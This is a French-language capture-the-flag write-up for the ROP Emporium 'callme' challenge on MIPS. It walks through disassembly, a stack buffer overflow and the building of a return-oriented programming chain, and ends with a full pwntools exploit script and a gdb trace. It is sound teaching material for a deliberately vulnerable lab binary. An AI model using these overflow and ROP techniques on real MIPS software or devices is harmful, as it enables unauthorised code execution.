---
Title: Ropemporium mipsel callme
Date: 2023-07-03
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# callme mipsel

## Introduction.

Dans ce troisième exercice on doit appeller trois fonctions dans l'ordre attendu avec trois paramètres attendus.

[callme](https://ropemporium.com/challenge/callme.html)


## Découverte

### Contenu du challenge

    -rwxr-xr-x 1 jce jce  8300  8 juil.  2020 callme_mipsel
    -rw-r--r-- 1 jce jce    32  5 juil.  2020 encrypted_flag.dat
    -rw-r--r-- 1 jce jce    16  3 juil.  2020 key1.dat
    -rw-r--r-- 1 jce jce    16  3 juil.  2020 key2.dat
    -rwxr-xr-x 1 jce jce 11600  8 juil.  2020 libcallme_mipsel.so


### Execution avec qemu

    jce@zbook310152:~/w/ropemporium/mipsel/03_callme$ qemu-mipsel callme_mipsel
    callme by ROP Emporium
    MIPS

    Hope you read the instructions...

    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
    Thank you!
    qemu: uncaught target signal 11 (Segmentation fault) - core dumped
    Erreur de segmentation

## Analyse

### Le programme principal

La fonction main

    ┌ 196: int main (int argc, char **envp, int32_t envp);
    │           ; arg int32_t envp @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int argc @ a0
    │           ; arg char **envp @ a2
    │           0x00400980      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400984      1c00bfaf       sw ra, (var_1ch)
    │           0x00400988      1800beaf       sw fp, (var_18h)
    │           0x0040098c      25f0a003       move fp, sp
    │           0x00400990      42001c3c       lui gp, 0x42                ; 'B'
    │           0x00400994      10909c27       addiu gp, gp, -0x6ff0
    │           0x00400998      1000bcaf       sw gp, (var_10h)
    │           0x0040099c      4480828f       lw v0, -0x7fbc(gp)          ; [0x411054:4]=0
    │           0x004009a0      0000428c       lw v0, (v0)
    │           0x004009a4      25380000       move a3, zero               ; int32_t arg_18h
    │           0x004009a8      02000624       addiu a2, zero, 2           ; int32_t arg_10h
    │           0x004009ac      25280000       move a1, zero               ; int32_t arg3
    │           0x004009b0      25204000       move a0, v0
    │           0x004009b4      4c80828f       lw v0, -sym.imp.setvbuf(gp) ; [0x41105c:4]=0x400d60 sym.imp.setvbuf
    │           0x004009b8      25c84000       move t9, v0
    │           0x004009bc      09f82003       jalr t9
    │           0x004009c0      00000000       nop
    │           0x004009c4      1000dc8f       lw gp, (var_10h)
    │           0x004009c8      4000023c       lui v0, 0x40                ; '@'
    │           0x004009cc      000e4424       addiu a0, v0, 0xe00         ; 0x400e00 ; "callme by ROP Emporium"
    │           0x004009d0      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41106c:4]=0x400d30 sym.imp.puts
    │           0x004009d4      25c84000       move t9, v0
    │           0x004009d8      09f82003       jalr t9
    │           0x004009dc      00000000       nop
    │           0x004009e0      1000dc8f       lw gp, (var_10h)
    │           0x004009e4      4000023c       lui v0, 0x40                ; '@'
    │           0x004009e8      180e4424       addiu a0, v0, 0xe18         ; 0x400e18 ; "MIPS\n"
    │           0x004009ec      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41106c:4]=0x400d30 sym.imp.puts
    │           0x004009f0      25c84000       move t9, v0
    │           0x004009f4      09f82003       jalr t9
    │           0x004009f8      00000000       nop
    │           0x004009fc      1000dc8f       lw gp, (var_10h)
    │           0x00400a00      9102100c       jal sym.pwnme
    │           0x00400a04      00000000       nop
    │           0x00400a08      1000dc8f       lw gp, (var_10h)
    │           0x00400a0c      4000023c       lui v0, 0x40                ; '@'
    │           0x00400a10      200e4424       addiu a0, v0, 0xe20         ; 0x400e20 ; "\nExiting"
    │           0x00400a14      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41106c:4]=0x400d30 sym.imp.puts
    │           0x00400a18      25c84000       move t9, v0
    │           0x00400a1c      09f82003       jalr t9
    │           0x00400a20      00000000       nop
    │           0x00400a24      1000dc8f       lw gp, (var_10h)
    │           0x00400a28      25100000       move v0, zero
    │           0x00400a2c      25e8c003       move sp, fp
    │           0x00400a30      1c00bf8f       lw ra, (var_1ch)
    │           0x00400a34      1800be8f       lw fp, (var_18h)
    │           0x00400a38      2000bd27       addiu sp, sp, 0x20
    │           0x00400a3c      0800e003       jr ra

La fonction vulnérable :

    ┌ 212: sym.pwnme (int32_t arg1, char **arg3, int32_t arg_10h, int32_t arg_18h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg char **arg3 @ a2
    │           0x00400a44      c0ffbd27       addiu sp, sp, -0x40
    │           0x00400a48      3c00bfaf       sw ra, (var_3ch)
    │           0x00400a4c      3800beaf       sw fp, (var_38h)
    │           0x00400a50      25f0a003       move fp, sp
    │           0x00400a54      42001c3c       lui gp, 0x42                ; 'B'
    │           0x00400a58      10909c27       addiu gp, gp, -0x6ff0
    │           0x00400a5c      1000bcaf       sw gp, (var_10h)
    │           0x00400a60      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x00400a64      25280000       move a1, zero
    │           0x00400a68      1800c227       addiu v0, fp, 0x18
    │           0x00400a6c      25204000       move a0, v0
    │           0x00400a70      4880828f       lw v0, -sym.imp.memset(gp)  ; [0x411058:4]=0x400d70 sym.imp.memset
    │           0x00400a74      25c84000       move t9, v0
    │           0x00400a78      09f82003       jalr t9
    │           0x00400a7c      00000000       nop
    │           0x00400a80      1000dc8f       lw gp, (var_10h)
    │           0x00400a84      4000023c       lui v0, 0x40                ; '@'
    │           0x00400a88      2c0e4424       addiu a0, v0, 0xe2c         ; 0x400e2c ; "Hope you read the instructions...\n"
    │           0x00400a8c      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41106c:4]=0x400d30 sym.imp.puts
    │           0x00400a90      25c84000       move t9, v0
    │           0x00400a94      09f82003       jalr t9
    │           0x00400a98      00000000       nop
    │           0x00400a9c      1000dc8f       lw gp, (var_10h)
    │           0x00400aa0      4000023c       lui v0, 0x40                ; '@'
    │           0x00400aa4      500e4424       addiu a0, v0, 0xe50         ; arg1 ; esilref: '> '
    │           0x00400aa8      6880828f       lw v0, -sym.imp.printf(gp)  ; [0x411078:4]=0x400d00 sym.imp.printf
    │           0x00400aac      25c84000       move t9, v0
    │           0x00400ab0      09f82003       jalr t9
    │           0x00400ab4      00000000       nop
    │           0x00400ab8      1000dc8f       lw gp, (var_10h)
    │           0x00400abc      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00400ac0      1800c227       addiu v0, fp, 0x18
    │           0x00400ac4      25284000       move a1, v0
    │           0x00400ac8      25200000       move a0, zero
    │           0x00400acc      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411080:4]=0x400cf0 sym.imp.read
    │           0x00400ad0      25c84000       move t9, v0
    │           0x00400ad4      09f82003       jalr t9
    │           0x00400ad8      00000000       nop
    │           0x00400adc      1000dc8f       lw gp, (var_10h)
    │           0x00400ae0      4000023c       lui v0, 0x40                ; '@'
    │           0x00400ae4      540e4424       addiu a0, v0, 0xe54         ; 0x400e54 ; "Thank you!"
    │           0x00400ae8      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41106c:4]=0x400d30 sym.imp.puts
    │           0x00400aec      25c84000       move t9, v0
    │           0x00400af0      09f82003       jalr t9
    │           0x00400af4      00000000       nop
    │           0x00400af8      1000dc8f       lw gp, (var_10h)
    │           0x00400afc      00000000       nop
    │           0x00400b00      25e8c003       move sp, fp
    │           0x00400b04      3c00bf8f       lw ra, (var_3ch)
    │           0x00400b08      3800be8f       lw fp, (var_38h)
    │           0x00400b0c      4000bd27       addiu sp, sp, 0x40
    │           0x00400b10      0800e003       jr ra
    └           0x00400b14      00000000       nop


La lecture du message s'effectue ainsi :

    │           0x00400ab8      1000dc8f       lw gp, (var_10h)
    │           0x00400abc      00020624       addiu a2, zero, 0x200        ; a2 = 0x200
    │           0x00400ac0      1800c227       addiu v0, fp, 0x18           ; v0 = fp+0x18
    │           0x00400ac4      25284000       move a1, v0                  ; a1 = v0 = fp+0x18
    │           0x00400ac8      25200000       move a0, zero                ; a0 = 0
    │           0x00400acc      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411080:4]=0x400cf0 sym.imp.read
    │           0x00400ad0      25c84000       move t9, v0
    │           0x00400ad4      09f82003       jalr t9                      ; read(0,fp+0x18,0x200)

Dans le prémabule les registres ra et fp on été sauvegardés avec :

    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           0x00400a48      3c00bfaf       sw ra, (var_3ch)
    │           0x00400a4c      3800beaf       sw fp, (var_38h)
Et sp=sp
    │           0x00400a50      25f0a003       move fp, sp

Donc notre buffer en fp+0x18 se trouve a une distance de 0x20 (32) de la sauvegarde de `fp` et 36 de celle `ra`.


La fonction suivante nous aide a construire notre attaque.

    [0x004007e0]> pdf @ sym.usefulFunction
    ┌ 188: sym.usefulFunction (int32_t arg1, int32_t arg2, int32_t arg3, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_4h @ sp+0x4
    │           ; var int32_t var_8h @ sp+0x8
    │           ; var int32_t var_ch @ sp+0xc
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_14h @ sp+0x14
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg2 @ a1
    │           ; arg int32_t arg3 @ a2
    │           0x00400b18      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400b1c      1c00bfaf       sw ra, (var_1ch)
    │           0x00400b20      1800beaf       sw fp, (var_18h)
    │           0x00400b24      25f0a003       move fp, sp
    │           0x00400b28      42001c3c       lui gp, 0x42                ; 'B'
    │           0x00400b2c      10909c27       addiu gp, gp, -0x6ff0
    │           0x00400b30      1000bcaf       sw gp, (var_10h)
    │           0x00400b34      06000624       addiu a2, zero, 6           ; arg3
    │           0x00400b38      05000524       addiu a1, zero, 5           ; arg2
    │           0x00400b3c      04000424       addiu a0, zero, 4           ; arg1
    │           0x00400b40      6480828f       lw v0, -sym.imp.callme_three(gp) ; [0x411074:4]=0x400d10 sym.imp.callme_three
    │           0x00400b44      25c84000       move t9, v0
    │           0x00400b48      09f82003       jalr t9
    │           0x00400b4c      00000000       nop
    │           0x00400b50      1000dc8f       lw gp, (var_10h)
    │           0x00400b54      06000624       addiu a2, zero, 6           ; arg3
    │           0x00400b58      05000524       addiu a1, zero, 5           ; arg2
    │           0x00400b5c      04000424       addiu a0, zero, 4           ; arg1
    │           0x00400b60      4080828f       lw v0, -sym.imp.callme_two(gp) ; [0x411050:4]=0x400d80 sym.imp.callme_two
    │           0x00400b64      25c84000       move t9, v0
    │           0x00400b68      09f82003       jalr t9
    │           0x00400b6c      00000000       nop
    │           0x00400b70      1000dc8f       lw gp, (var_10h)
    │           0x00400b74      06000624       addiu a2, zero, 6           ; arg3
    │           0x00400b78      05000524       addiu a1, zero, 5           ; arg2
    │           0x00400b7c      04000424       addiu a0, zero, 4           ; arg1
    │           0x00400b80      6080828f       lw v0, -sym.imp.callme_one(gp) ; [0x411070:4]=0x400d20 sym.imp.callme_one
    │           0x00400b84      25c84000       move t9, v0
    │           0x00400b88      09f82003       jalr t9
    │           0x00400b8c      00000000       nop
    │           0x00400b90      1000dc8f       lw gp, (var_10h)
    │           0x00400b94      01000424       addiu a0, zero, 1           ; arg1
    │           0x00400b98      5480828f       lw v0, -sym.imp.exit(gp)    ; [0x411064:4]=0x400d40 sym.imp.exit
    │           0x00400b9c      25c84000       move t9, v0
    │           0x00400ba0      09f82003       jalr t9


    [0x004007e0]> pd 40 @0x400bb0
    │           ;-- usefulGadgets:
    │           0x00400bb0      1000a48f       lw a0, (var_10h)
    │           0x00400bb4      0c00a58f       lw a1, (var_ch)
    │           0x00400bb8      0800a68f       lw a2, (var_8h)
    │           0x00400bbc      0400b98f       lw t9, (var_4h)
    │           0x00400bc0      09f82003       jalr t9
    │           0x00400bc4      00000000       nop
    │           0x00400bc8      1400bf8f       lw ra, (var_14h)
    │           0x00400bcc      0800e003       jr ra
    └           0x00400bd0      1800bd23       addi sp, sp, 0x18



### Observation du debordement

b *pwnme+172

Juste avant le read :

    gef➤  x/20x $sp
    0x40800c10:	0x00400e18	0xffffffff	0x00000001	0x00000000
                fp et sp
    0x40800c20:	0x00419010	0x3ffd4584	0x00000000	0x00000000
                                        fp+18
    0x40800c30:	0x00000000	0x00000000	0x00000000	0x00000000
    0x40800c40:	0x00000000	0x00000000	0x40800c50	0x00400a08
                                        save sp     save ra
    0x40800c50:	0x40800c9c	0x3ffca0ac	0x00400674	0x3ffbf41c


Apres lecture de : aaaaaaaabbbbbbbbccccccccddddddddAAAABBBB
                   <-         32                  > sp  ra
───────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤  x/20x $sp
    0x40800c10:	0x00400e18	0xffffffff	0x00000001	0x00000000
    0x40800c20:	0x00419010	0x3ffd4584	0x61616161	0x61616161
    0x40800c30:	0x62626262	0x62626262	0x63636363	0x63636363
    0x40800c40:	0x64646464	0x64646464	0x41414141	0x42424242
    0x40800c50:	0x40800c0a	0x3ffca0ac	0x00400674	0x3ffbf41c


## Construction de l'attaque

### Recherche de gadgets

On peut rechercher un gadget contenant un chargement de $a0 et de $a1 par exemple

ROPgadget -binary callme_mispel|grep "lw \$a0" |grep "\a1"

On trouve le gadget situé dans usefulGadgets.

    0x00400bb0 : lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop

L'instruction jalr effectue un saut et une affectation du registre d'adresse de retour.

>jalr r     # $ra <— PC+4  $ra <— return address
>           # PC  <— $r    load the PC with the address in $r

Usage du gadget :

`lw $t9, 4($sp)` charge dand `t9` le contenu de $sp+4 donc pas la première entrée de la pile mais la suivante.
On doit donc prevoir une entrée de junk avant.
La dernière instruction effectue l'equivalent d'un call à l'adresse placée dan `t9` on doit donc y mettre l'adresse de la fonction.

Ensuite on place les 3 paramètres dans l'ordre inverse puisque il sont lus respectivement dans `sp` + 16,12,8.

Ca qui nous donne :

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| 0x00400bb0 | lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop| gadget de chargement
| callme_xxx| | Pour $t9
| 0xd00df00d | | pour $a2
| 0xcafebabe | | pour $a1
| 0xdeadbeef | | pour $a0
| | |

La question qu'on se pose alors est quid de l'enchainement pour continuer le déroulement de la chaine de ROP.

Au moment de `jarl $t9` on a "$ra <— PC+4" soit après l'instruction jalr ce qui est logique.

Le gadget complet est donc :

    │           0x00400bb0      1000a48f       lw a0, (var_10h)
    │           0x00400bb4      0c00a58f       lw a1, (var_ch)
    │           0x00400bb8      0800a68f       lw a2, (var_8h)
    │           0x00400bbc      0400b98f       lw t9, (var_4h)
    │           0x00400bc0      09f82003       jalr t9
    │           0x00400bc4      00000000       nop
    │           0x00400bc8      1400bf8f       lw ra, (var_14h)
    │           0x00400bcc      0800e003       jr ra
    └           0x00400bd0      1800bd23       addi sp, sp, 0x18

Le seconde partie est nécessaire à l'enchainement sur la chaine de ROP.

Apres le "call" on reviens sur le nop. Et donc on charge dans `ra` sp+20 juste après la valeur posée pour `a0` c'est a dire là suite de notre chaine.

Mais ce n'est pas sufisant car a cette étape le pointeur de pile n'a pas bougé.
Il est nécessaire de l'ajuster avec :
    └           0x00400bd0      1800bd23       addi sp, sp, 0x18

On se demande cependant par quel miracle l'instruction `addi` s'execute puisqu'on saute avec le jr.

En fait c'est que les instructions de type saut semblent executer l'instuction suivante de manière simultannée.
D'ou le nop après `jarl`.
L'execution sous gdb de la chaine en fin d'article le montre.

Sans cet ajustement on risque au mieux d boucler sur callme_one.

Ce type d'enchainement n'est pas probable dans une code ordinaire.
Les outils comme ropper ou ROPgadget ne le détecte pas. C'est à nous de rechercher.

Un gadget d'appel.
Un gadget de lien **consécutif** de type "lw reg,(sp+xx); je reg".
Un gadget d'ajustement de la pile.

Ce qui nous donne :

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| 0x00400bb0 | lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; ... |
| callme_one| | Pour $t9
| 0xd00df00d | | pour $a2
| 0xcafebabe | | pour $a1
| 0xdeadbeef | | pour $a0
| 0x00400bb0 | lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; ...| gadget de chargement
| callme_two| | Pour $t9
| 0xd00df00d | | pour $a2
| 0xcafebabe | | pour $a1
| 0xdeadbeef | | pour $a0
| 0x00400bb0 | lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; ...| gadget de chargement
| callme_three | | Pour $t9
| 0xd00df00d | | pour $a2
| 0xcafebabe | | pour $a1
| 0xdeadbeef | | pour $a0

La structuee est régulière et se prète à une boucle de type

Pour chaque call_xxx parmis [call_one, call_two, call_three]
    . . .



## Exploitation

### Script python

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+204
c
'''

# Gadgets
# 0x00400bb0 : lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ;
g_pop_t9a2a1a0 = 0x00400bb0

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x24

PL=b"A"*offset
for adrcall in [callme_one, callme_two, callme_three ]:
    PL+=p32(g_pop_t9a2a1a0)    # Super gadget
    PL+=p32(0)                 # junk
    PL+=p32(adrcall)           # t9
    PL+=p32(0xd00df00d)        # a2
    PL+=p32(0xcafebabe)        # a1
    PL+=p32(0xdeadbeef)        # a0

io.recvuntil(b"> ")

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```
### Execution

    python3 solve.py
    [*] '/w/ropemporium/mipsel/03_callme/callme_mipsel'
        Arch:     mips-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/mipsel/03_callme/callme_mipsel': pid 65
    [*] callme_one=400d1c
    [*] callme_two=400d7c
    [*] callme_three=400d0c
    [+] flag : ROPE{a_placeholder_32byte_flag!}
    [*] Stopped process '/w/ropemporium/mipsel/03_callme/callme_mipsel' (pid 65)


### Déroulement sous gdb


Le déroulemen ci desous est celui du script précéddent en l'état donc avec un soucis

    python3 solve.py -d


BP en fin de pwnme.

     0x400b04 <pwnme+192>      lw     ra, 60(sp)
     0x400b08 <pwnme+196>      lw     s8, 56(sp)
     0x400b0c <pwnme+200>      addiu  sp, sp, 64
 →   0x400b10 <pwnme+204>      jr     ra
   ↳    0x400bb0 <usefulGadgets+0> lw     a0, 16(sp)
        0x400bb4 <usefulGadgets+4> lw     a1, 12(sp)
        0x400bb8 <usefulGadgets+8> lw     a2, 8(sp)
        0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
        0x400bc0 <usefulGadgets+16> jalr   t9
        0x400bc4 <usefulGadgets+20> nop

    gef➤  x/12x $sp
    0x40800c30:     0x00000000      0x00400d1c      0xd00df00d      0xcafebabe
                    junk            callme_one      a2              a1
    0x40800c40:     0xdeadbeef      0x00400bb0      0x00000000      0x00400d7c
                    a0              gadget          junk            callme_two
    0x40800c50:     0xd00df00d      0xcafebabe      0xdeadbeef      0x00400bb0

On avance sur le call

    ni 3
     0x400bb4 <usefulGadgets+4> lw     a1, 12(sp)
     0x400bb8 <usefulGadgets+8> lw     a2, 8(sp)
     0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
    →0x400bc0 <usefulGadgets+16> jalr   t9
     0x400bc4 <usefulGadgets+20> nop
     0x400bc8 <usefulGadgets+24> lw     ra, 20(sp)
     0x400bcc <usefulGadgets+28> jr     ra
     0x400bd0 <usefulGadgets+32> addi   sp, sp, 24
     0x400bd4 <usefulGadgets+36> nop
    gef➤  i r a0 a1 a2 t9
    a0: 0xdeadbeef
    a1: 0xcafebabe
    a2: 0xd00df00d
    t9: 0x400d1c

Les registres sons bien chargés.
Verifions t9 :

    gef➤  x/3i $t9
    =>  0x400d1c <callme_three+12>:  li      t8,25
        0x400d20 <callme_one>:       lw      t9,-32752(gp)
        0x400d24 <callme_one+4>:     move    t7,ra

Oups l'adresse de callme_one@plt est erronée cela ressemble à un bug de pwntool ( elf.plt["callme_one"] ).
L'instruction pointée est neutre sur l'execution on continue donc mais on peut corriger les adresses avec un +4.

L'addresse de callme_one n'etant pas resolue, le pas à pas va être laborieux. On pose un point d'arrêt en fin de fonction.

    disas callme_one
    ...
    0x3ffa0a14 <+484>:   addiu   sp,sp,40
    0x3ffa0a18 <+488>:   jr      ra
    0x3ffa0a1c <+492>:   nop

    gef➤  b *callme_one+488
    Breakpoint 2 at 0x3ffa0a18
    continue
     → 0x3ffa0a18 <callme_one+488> jr     ra
        ↳   0x400bc8 <usefulGadgets+24> lw     ra, 20(sp)
            0x400bcc <usefulGadgets+28> jr     ra

A la fin de callme_on `ra` pointe la prochaine instruction du gadget.
A noter que le nop en 0x400bc4 est bien nécessaire . On verra pourquoi plus loin.

continue

        0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
        0x400bc0 <usefulGadgets+16> jalr   t9
        0x400bc4 <usefulGadgets+20> nop
    →   0x400bc8 <usefulGadgets+24> lw     ra, 20(sp)
        0x400bcc <usefulGadgets+28> jr     ra
        0x400bd0 <usefulGadgets+32> addi   sp, sp, 24
        0x400bd4 <usefulGadgets+36> nop
        0x400bd8 <usefulGadgets+40> nop
        0x400bdc <usefulGadgets+44> nop

La pile est toujour dans cet état :

    gef➤  x/12x $sp
    0x40800c30:     0xdeadbeef      0xcafebabe      0xd00df00d      0xcafebabe
    0x40800c40:     0xdeadbeef      0x00400bb0      0x00000000      0x00400d7c
                                    sp+20
    0x40800c50:     0xd00df00d      0xcafebabe      0xdeadbeef      0x00400bb0

ni

        0x400bc0 <usefulGadgets+16> jalr   t9
        0x400bc4 <usefulGadgets+20> nop
        0x400bc8 <usefulGadgets+24> lw     ra, 20(sp)
    →  0x400bcc <usefulGadgets+28> jr     ra
        ↳   0x400bb0 <usefulGadgets+0> lw     a0, 16(sp)
            0x400bb4 <usefulGadgets+4> lw     a1, 12(sp)
            0x400bb8 <usefulGadgets+8> lw     a2, 8(sp)
            0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
            0x400bc0 <usefulGadgets+16> jalr   t9
            0x400bc4 <usefulGadgets+20> nop

On est pret a executer de nouveau le gadget, ra pointe dessus.
Capendant la pile est toujours la même :

    gef➤  i r $sp
    sp: 0x40800c30

ni

    →   0x400bb0 <usefulGadgets+0> lw     a0, 16(sp)
        0x400bb4 <usefulGadgets+4> lw     a1, 12(sp)
        0x400bb8 <usefulGadgets+8> lw     a2, 8(sp)
        0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
        0x400bc0 <usefulGadgets+16> jalr   t9
        0x400bc4 <usefulGadgets+20> nop

Et la pile est ajustée

    gef➤  x/12x $sp
    0x40800c48:     0x00000000      0x00400d7c      0xd00df00d      0xcafebabe
    0x40800c58:     0xdeadbeef      0x00400bb0      0x00000000      0x00400d0c
    0x40800c68:     0xd00df00d      0xcafebabe      0xdeadbeef      0x40800c0a

d'ou vient ce "sp = sp + 0x18" ????

On es là :

=> 0x400bcc <usefulGadgets+28>: jr      ra
   0x400bd0 <usefulGadgets+32>: addi    sp,sp,24
   0x400bd4 <usefulGadgets+36>: nop

L'instruction `jr $ra` n'est pas sensée modifier `sp`.

Si on suite le saut avec l'instuction gdb "si" :

    →   0x400bb0 <usefulGadgets+0> lw     a0, 16(sp)
        0x400bb4 <usefulGadgets+4> lw     a1, 12(sp)
        0x400bb8 <usefulGadgets+8> lw     a2, 8(sp)
        0x400bbc <usefulGadgets+12> lw     t9, 4(sp)
        0x400bc0 <usefulGadgets+16> jalr   t9
        0x400bc4 <usefulGadgets+20> nop

    gef➤  i r $sp
    sp: 0x40800c48

L'instuction `addi sp,sp,24` est en fait executée avec le jump.
On peut remarquer que les instructions de saut sont systématiquement suivies d'un nop dans le code.
En particulier celui de notre gadget.


Mais avec cet ajustement la chaine peut continuer et callme_one puis callme_two sont appelés.



